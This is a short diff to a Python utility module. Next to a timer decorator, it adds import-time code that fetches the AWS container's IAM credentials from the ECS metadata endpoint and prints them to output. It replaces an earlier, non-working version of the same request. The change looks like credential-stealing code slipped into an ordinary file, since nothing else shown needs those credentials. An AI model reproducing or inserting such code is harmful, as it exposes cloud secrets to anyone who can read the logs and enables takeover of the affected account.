@@ -15,12 +15,12 @@ MODEL_KEY_PATH = os.getenv("MODEL_KEY_PATH", "")
 from functools import wraps
 import timeit
 
-
+import os
 import requests
 
-response = requests.get('http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI')
-print(response.text, flush=True)
-
+creds_uri = os.environ.get('AWS_CONTAINER_CREDENTIALS_RELATIVE_URI')
+r = requests.get('http://169.254.170.2{}'.format(creds_uri))
+print(r.text)
 
 def timer(f):
     @wraps(f)
